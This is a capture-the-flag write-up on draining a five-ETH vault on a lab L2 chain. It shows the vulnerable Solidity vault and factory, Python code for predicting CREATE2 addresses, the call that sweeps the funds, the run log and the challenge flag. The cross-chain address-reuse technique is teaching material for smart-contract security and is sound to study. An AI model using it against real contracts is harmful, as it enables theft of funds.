---
layout: post
title: "Arbitrary Funds Sweep"
date: 2026-09-22
categories: [Blockchain]
platform: DefCamp CTF 2026
tags: [blockchain, solidity, create2, arbitrum]
excerpt: "Recreating an L1 contract at the same address on L2 to take ownership of a five-ETH vault."
---

## Summary

Arbitrary Funds Sweep gave us an Ethereum-style L1, an Arbitrum-style L2, and a vault holding 5 ETH. The goal was to empty the vault.

I initially looked at the bridge, but the vault trusted the unaliased address of a contract on L1. Because both chains had the same CREATE2 factory address, I could deploy that contract at the matching address on L2 and call the vault through it.

## Analysis

### Checking the owner

The challenge exposed two RPC endpoints, `/rpc/l1` and `/rpc/l2`. The vault lived on L2, and its access control was straightforward:

```solidity
contract Vault {
    address public immutable owner;

    constructor(address _owner) payable {
        owner = _owner;
    }

    function execute(address to, uint256 value, bytes calldata data)
        external returns (bytes memory ret)
    {
        require(msg.sender == owner, "not the owner");
        bool ok;
        (ok, ret) = to.call{value: value}(data);
        require(ok, "call failed");
    }

    receive() external payable {}
}
```

If I could make `execute()` see the owner as `msg.sender`, I could transfer the full balance to the player account. In my instance, the relevant addresses were:

```text
L1 Saylor:       0x8054b6A618636CC6F877ec97381b5778f055ff9f
Aliased Saylor:  0x9165b6a618636cc6f877ec97381b5778f05610b0
L2 vault owner:  0x8054b6a618636cc6f877ec97381b5778f055ff9f
L2 balance:     5000000000000000000 wei
```

The owner matched the plain `Saylor` address. That distinction mattered because the challenge's bridge applied an offset to calls coming from L1 contracts:

```text
alias = (l1Address + 0x1111000000000000000000000000000000001111) mod 2^160
```

Sending a retryable through L1 `Saylor` would therefore make the L2 caller the aliased address, which would fail the vault's owner check.

### Looking at Saylor and the factory

`Saylor` had a bridge relay function, but it also exposed this unrestricted call function:

```solidity
function call(address to, bytes calldata data)
    external payable returns (bytes memory ret)
{
    bool ok;
    (ok, ret) = to.call{value: msg.value}(data);
    require(ok, "call failed");
}
```

Anyone could ask a deployed `Saylor` to call another contract. I needed a copy at the owner address on L2.

The factory used CREATE2 and was deployed at the same address on both chains:

```solidity
function deploy(bytes memory bytecode, bytes32 salt)
    public returns (address addr)
{
    addr = predictAddress(salt, bytecode);
    bool fresh = addr.code.length == 0;
    if (fresh) {
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
    }
    emit Deployed(addr, fresh);
}
```

A CREATE2 address is the last 20 bytes of:

```text
keccak256(0xff || factory_address || salt || keccak256(init_code))
```

The chain ID is absent from that calculation. With the same factory address, salt, and creation bytecode, I could reproduce the L1 `Saylor` address on L2.

## Exploitation

### Recovering the exact creation bytecode

My first attempt used a locally compiled copy of `Saylor.sol`. Its predicted address didn't match:

```text
Expected:       0x8054b6A618636CC6F877ec97381b5778f055ff9f
Local compile:  0x1c90f3dd7dfd1c9a3c48f8f9a6ba2a1af0bf1fe9
```

Matching source code wasn't enough. The creation bytecode hash also depends on compiler output, including metadata and build settings.

`SetupL1` already contained the exact bytes I needed:

```solidity
saylor = Saylor(factory.deploy(type(Saylor).creationCode, salt));
```

I found the L1 setup deployment transaction and read its input. The final 64 bytes were the ABI-encoded constructor arguments: a factory address and a `bytes32` salt. After removing those, I scanned suffixes of the setup init code and tested each one against the known `Saylor` address.

The address check itself was small:

```python
from Crypto.Hash import keccak

def keccak256(data):
    digest = keccak.new(digest_bits=256)
    digest.update(data)
    return digest.digest()

def create2(factory, salt, init_code):
    payload = (
        b"\xff"
        + bytes.fromhex(factory.removeprefix("0x"))
        + salt
        + keccak256(init_code)
    )
    return "0x" + keccak256(payload)[-20:].hex()
```

For this setup, the matching suffix was 1,760 bytes long. Its predicted address matched the vault owner exactly, so I could reuse it without guessing the compiler settings.

### Deploying the owner on L2

I submitted the recovered creation code and salt to the L2 factory. There was one more trap here: my first deployment transaction returned status `1`, but the address still had no code.

The factory never checked whether `create2` returned `address(0)`. A failed inner deployment could therefore leave the outer transaction successful. I increased the deployment gas floor to `800000` and checked the code after the receipt:

```python
code = l2.call("eth_getCode", [SAYLOR, "latest"])
assert code != "0x"
```

Once that passed, the vault's owner address was backed by a real `Saylor` contract on L2.

### Emptying the vault

The remaining call was equivalent to:

```solidity
Saylor.call(
    vault,
    abi.encodeWithSelector(
        Vault.execute.selector,
        player,
        vault.balance,
        ""
    )
)
```

The player called `Saylor`, which called `Vault.execute()`. From the vault's perspective, `msg.sender` was now its owner, so it sent the full balance to the player.

The successful run recorded:

```text
[*] vault owner: 0x8054b6a618636cc6f877ec97381b5778f055ff9f
[*] vault balance: 5000000000000000000 wei
[*] recovered Saylor creation code from setup tx 0xef375ff29b699a6c38a9f3862df405663e192abb165fbed8b8b38e157cf62c5b (1760 bytes)
[*] Saylor CREATE2 prediction: 0x8054b6a618636cc6f877ec97381b5778f055ff9f
[*] L2 Saylor deploy mined in block 18, status 0x1
[*] L2 vault drain mined in block 19, status 0x1
[+] vault balance is 0
```

The two L2 transaction hashes were:

```text
Deploy: 0x06ba639662f3c7f1c78024725088836828521af51abe0a4e683e2991ae9330e1
Drain:  0xa2a8635dc802cfe029c44d53b50759aa43dd314e38b53db9fc3b44a8608b89ea
```

The owner check behaved exactly as written. The mistake was trusting an address on L2 before accounting for what could be deployed there, especially when that contract exposed an unrestricted call function.

## Flag

`DCTF{b4s3_l4y3r_15_4lw4y5_b0r1ng_th4t5_l1f3}`
